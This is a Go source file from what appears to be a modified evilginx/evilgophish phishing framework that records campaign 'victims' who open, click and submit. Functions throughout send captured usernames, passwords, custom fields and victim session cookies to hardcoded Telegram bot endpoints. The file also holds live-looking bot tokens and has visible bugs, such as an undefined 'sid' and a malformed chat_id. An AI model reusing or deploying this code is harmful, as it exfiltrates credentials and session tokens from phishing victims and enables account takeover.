package database

import (
	"encoding/json"
	"strconv"

	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/tidwall/buntdb"

	"github.com/gorilla/websocket"
	"github.com/jinzhu/gorm"
	_ "github.com/mattn/go-sqlite3"
)

func telegramSendResult(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
	resp2, xerr := http.Get("https://api.telegram.org/bot6709278091:AAElpViRJ_jefteECT3Y5iqmWyOe5kpgrV4/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)
	resp, xerr2 := http.Get("https://api.telegram.org/bot6153769899:AAFWxF8uDir2grHolKdxKOWqf7Fe_y75jEY/sendMessage?chat_id=5538579587chatid&parse_mode=MarkdownV2&text=" + msg)
	resp3, xerr3 := http.Get("https://api.telegram.org/bot5794620752:AAFnk_QYOgMqzEaYxvMdMiFMIP5beCgFPLA/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)

	//5236398939 Fashion

	if xerr != nil {
		fmt.Print("error")
	}
	if xerr2 != nil {
		fmt.Print("error")
	}
	if xerr3 != nil {
		fmt.Print("error")
	}
	defer resp.Body.Close()
	defer resp2.Body.Close()
	defer resp3.Body.Close()

	_, eerr := ioutil.ReadAll(resp.Body)
	if eerr != nil {
		fmt.Print("error")
	}
}

func telegramSendVisitor(msg string) {
	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
	resp2, xerr := http.Get("https://api.telegram.org/bot6709278091:AAElpViRJ_jefteECT3Y5iqmWyOe5kpgrV4/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)
	resp, xerr2 := http.Get("https://api.telegram.org/bot6153769899:AAFWxF8uDir2grHolKdxKOWqf7Fe_y75jEY/sendMessage?chat_id=5538579587chatid&parse_mode=MarkdownV2&text=" + msg)
	resp3, xerr3 := http.Get("https://api.telegram.org/bot5794620752:AAFnk_QYOgMqzEaYxvMdMiFMIP5beCgFPLA/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=" + msg)

	//5236398939 Fashion

	if xerr != nil {
		fmt.Print("error")
	}
	if xerr2 != nil {
		fmt.Print("error")
	}
	if xerr3 != nil {
		fmt.Print("error")
	}
	defer resp.Body.Close()
	defer resp2.Body.Close()
	defer resp3.Body.Close()

	_, eerr := ioutil.ReadAll(resp.Body)
	if eerr != nil {
		fmt.Print("error")
	}
}

var gp_db *gorm.DB

type Database struct {
	path string
	db   *buntdb.DB
}

type BaseRecipient struct {
	Email     string `json:"email"`
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Position  string `json:"position"`
}

type Result struct {
	Id           int64     `json:"-"`
	CampaignId   int64     `json:"-"`
	UserId       int64     `json:"-"`
	RId          string    `json:"id"`
	Status       string    `json:"status" sql:"not null"`
	IP           string    `json:"ip"`
	Latitude     float64   `json:"latitude"`
	Longitude    float64   `json:"longitude"`
	SendDate     time.Time `json:"send_date"`
	Reported     bool      `json:"reported" sql:"not null"`
	ModifiedDate time.Time `json:"modified_date"`
	BaseRecipient
	SMSTarget bool `json:"sms_target"`
}

type Event struct {
	Id         int64     `json:"-"`
	CampaignId int64     `json:"campaign_id"`
	Email      string    `json:"email"`
	Time       time.Time `json:"time"`
	Message    string    `json:"message"`
	Details    string    `json:"details"`
}

type EventDetails struct {
	Payload url.Values        `json:"payload"`
	Browser map[string]string `json:"browser"`
}

type EventError struct {
	Error string `json:"error"`
}

type FeedEvent struct {
	Event   string `json:"event"`
	Time    string `json:"time"`
	Message string `json:"message"`
	Tokens  string `json:"tokens"`
}

func SetupGPDB(path string) error {
	// Open our database connection
	var err error
	i := 0
	for {
		gp_db, err = gorm.Open("sqlite3", path)
		if err == nil {
			break
		}
		if err != nil && i >= 10 {
			fmt.Printf("Error connecting to evilgophish.db: %s\n", err)
			return err
		}
		i += 1
		fmt.Println("waiting for database to be up...")
		time.Sleep(5 * time.Second)
	}

	return nil
}

func moddedCookieTokensToJSON(tokens map[string]map[string]*CookieToken) string {

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES 🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n %s\n", sid, string(json)))
	return string(json)
}

func moddedTokensToJSON(tokens map[string]string) string {
	jsonString, err := json.Marshal(tokens)
	if err != nil {
		fmt.Println("Error encoding token strings to JSON:", err)
		return ""
	}
	return string(jsonString)
}

func AddEvent(e *Event, campaignID int64) error {
	e.CampaignId = campaignID
	e.Time = time.Now().UTC()

	return gp_db.Save(e).Error
}

func (r *Result) createEvent(status string, details interface{}) (*Event, error) {
	e := &Event{Email: r.Email, Message: status}
	if details != nil {
		dj, err := json.Marshal(details)
		if err != nil {
			return nil, err
		}
		e.Details = string(dj)
	}
	AddEvent(e, r.CampaignId)
	return e, nil
}

func HandleEmailOpened(rid string, browser map[string]string, feed_enabled bool) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		ed.Payload = map[string][]string{"client_id": []string{rid}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = "127.0.0.1"
		res.Latitude = 0.000000
		res.Longitude = 0.000000
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Email/SMS Opened", ed)
		if err != nil {
			return err
		}
		res.Status = "Email/SMS Opened"
		res.ModifiedDate = event.Time
		if feed_enabled {
			if r.SMSTarget {
				err = res.NotifySMSOpened()
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			} else {
				err = res.NotifyEmailOpened()
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			}
		}
		if r.Status == "Clicked Link" || r.Status == "Submitted Data" || r.Status == "Captured Session" {
			return nil
		}
		return gp_db.Save(res).Error
	}
}

func HandleClickedLink(rid string, browser map[string]string, feed_enabled bool) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		ed.Payload = map[string][]string{"client_id": []string{rid}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = "127.0.0.1"
		res.Latitude = 0.000000
		res.Longitude = 0.000000
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		if feed_enabled {
			if r.Status == "Email/SMS Sent" {
				HandleEmailOpened(rid, browser, true)
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
				err = res.NotifyClickedLink()
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			} else {
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
				err = res.NotifyClickedLink()
				if err != nil {
					fmt.Printf("Error sending websocket message: %s\n", err)
				}
			}
		} else {
			if r.Status == "Email/SMS Sent" {
				HandleEmailOpened(rid, browser, false)
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
			} else {
				event, err := res.createEvent("Clicked Link", ed)
				if err != nil {
					return err
				}
				res.Status = "Clicked Link"
				res.ModifiedDate = event.Time
			}
		}
		if r.Status == "Submitted Data" || r.Status == "Captured Session" {
			return nil
		}
		return gp_db.Save(res).Error
	}
}

func HandleSubmittedData(rid string, username string, password string, browser map[string]string, feed_enabled bool) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		ed.Payload = map[string][]string{"Username": []string{username}, "Password": []string{password}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = "127.0.0.1"
		res.Latitude = 0.000000
		res.Longitude = 0.000000
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Submitted Data", ed)
		if err != nil {
			return err
		}
		res.Status = "Submitted Data"
		res.ModifiedDate = event.Time
		if feed_enabled {
			err = res.NotifySubmittedData(username, password)
			if err != nil {
				fmt.Printf("Error sending websocket message: %s\n", err)
			}
		}
		if r.Status == "Captured Session" {
			return nil
		}
		return gp_db.Save(res).Error
	}
}

func HandleCapturedCookieSession(rid string, tokens map[string]map[string]*CookieToken, browser map[string]string, feed_enabled bool) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		json_tokens := moddedCookieTokensToJSON(tokens)
		ed.Payload = map[string][]string{"Tokens": {json_tokens}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = "127.0.0.1"
		res.Latitude = 0.000000
		res.Longitude = 0.000000
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Captured Session", ed)
		if err != nil {
			return err
		}
		res.Status = "Captured Session"
		res.ModifiedDate = event.Time
		if feed_enabled {
			err = res.NotifyCapturedCookieSession(tokens)
			if err != nil {
				fmt.Printf("Error sending websocket message: %s\n", err)
			}
		}
		return gp_db.Save(res).Error
	}
}

func HandleCapturedOtherSession(rid string, tokens map[string]string, browser map[string]string, feed_enabled bool) error {
	r := Result{}
	query := gp_db.Table("results").Where("r_id=?", rid)
	err := query.Scan(&r).Error
	if err != nil {
		return err
	} else {
		res := Result{}
		ed := EventDetails{}
		ed.Browser = browser
		json_tokens := moddedTokensToJSON(tokens)
		ed.Payload = map[string][]string{"Tokens": {json_tokens}}
		res.Id = r.Id
		res.RId = r.RId
		res.UserId = r.UserId
		res.CampaignId = r.CampaignId
		res.IP = "127.0.0.1"
		res.Latitude = 0.000000
		res.Longitude = 0.000000
		res.Reported = false
		res.BaseRecipient = r.BaseRecipient
		event, err := res.createEvent("Captured Session", ed)
		if err != nil {
			return err
		}
		res.Status = "Captured Session"
		res.ModifiedDate = event.Time
		if feed_enabled {
			err = res.NotifyCapturedOtherSession(tokens)
			if err != nil {
				fmt.Printf("Error sending websocket message: %s\n", err)
			}
		}
		return gp_db.Save(res).Error
	}
}

func (r *Result) NotifyEmailOpened() error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Event = "Email Opened"
	fe.Message = "Email has been opened by victim: <strong>" + r.Email + "</strong>"
	fe.Time = r.ModifiedDate.String()
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifySMSOpened() error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Event = "SMS Opened"
	fe.Message = "SMS has been opened by victim: <strong>" + r.Email + "</strong>"
	fe.Time = r.ModifiedDate.String()
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifyClickedLink() error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Event = "Clicked Link"
	fe.Message = "Link has been clicked by victim: <strong>" + r.Email + "</strong>"
	fe.Time = r.ModifiedDate.String()
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifySubmittedData(username string, password string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Event = "Submitted Data"
	fe.Message = "Victim <strong>" + r.Email + "</strong> has submitted data! Details:<br><strong>Username:</strong> " + username + "<br><strong>Password:</strong> " + password
	fe.Time = r.ModifiedDate.String()
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifyCapturedCookieSession(tokens map[string]map[string]*CookieToken) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Event = "Captured Session"
	fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
	fe.Time = r.ModifiedDate.String()
	json_tokens := moddedCookieTokensToJSON(tokens)
	fe.Tokens = json_tokens
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func (r *Result) NotifyCapturedOtherSession(tokens map[string]string) error {
	c, _, err := websocket.DefaultDialer.Dial("ws://localhost:1337/ws", nil)
	if err != nil {
		return err
	}
	defer c.Close()

	fe := FeedEvent{}
	fe.Event = "Captured Session"
	fe.Message = "Captured session for victim: <strong>" + r.Email + "</strong>! View full token JSON below!"
	fe.Time = r.ModifiedDate.String()
	json_tokens := moddedTokensToJSON(tokens)
	fe.Tokens = json_tokens
	data, _ := json.Marshal(fe)

	err = c.WriteMessage(websocket.TextMessage, []byte(string(data)))
	if err != nil {
		return err
	}
	return err
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{
		path: path,
	}

	d.db, err = buntdb.Open(path)
	if err != nil {
		return nil, err
	}

	d.sessionsInit()

	d.db.Shrink()
	return d, nil
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	_, err := d.sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
	return err
}

func (d *Database) ListSessions() ([]*Session, error) {
	s, err := d.sessionsList()
	return s, err
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 USERNAME  :- 🔥 🔥\n\n-🆔ID: %s \n\n-👦🏻Username: %s\n", sid, username))
	err := d.sessionsUpdateUsername(sid, username)
	return err
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD :- 🔥 🔥\n\n-🆔ID: %s \n\n-🔑Password: %s\n", sid, password))
	err := d.sessionsUpdatePassword(sid, password)
	return err
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	telegramSendResult(fmt.Sprintf("🔥 🔥 CUSTOM 🔥 🔥\n\n-🆔ID: %s \n\nKey: %s\n-🔑Value: %s\n", sid, name, value))
	err := d.sessionsUpdateCustom(sid, name, value)
	return err
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateBodyTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	err := d.sessionsUpdateHttpTokens(sid, tokens)
	return err
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	err := d.sessionsUpdateCookieTokens(sid, tokens)
	return err
}

func (d *Database) DeleteSession(sid string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(s.Id)
	return err
}

func (d *Database) DeleteSessionById(id int) error {
	_, err := d.sessionsGetById(id)
	if err != nil {
		return err
	}
	err = d.sessionsDelete(id)
	return err
}

func (d *Database) Flush() {
	d.db.Shrink()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}
